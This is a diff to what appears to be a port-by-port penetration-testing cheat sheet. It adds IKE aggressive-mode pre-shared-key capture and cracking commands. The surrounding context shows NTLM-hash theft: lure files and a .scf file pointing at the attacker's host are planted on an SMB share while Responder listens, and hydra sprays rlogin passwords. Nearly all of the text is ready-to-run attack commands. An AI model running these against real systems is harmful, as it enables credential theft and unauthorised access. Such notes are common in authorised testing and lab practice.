@@ -1173,6 +1173,10 @@ sudo responder -I tun0 -v
 ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/'SHARE NAME' -D 'DIRECTORY/FOLDER' -U 'anonymous'%'' -c 'lcd file; recurse; prompt; mput *'
 echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\responder\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
 
+[*] (500) IKE
+ike-scan -M -A $TARGET --pskcrack=ike_hashes.txt
+psk-crack -d $rockyou ike_hashes.txt
+
 [*] (512-514) RSERVICES
 +---------- Spray Service ----------+
 (hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
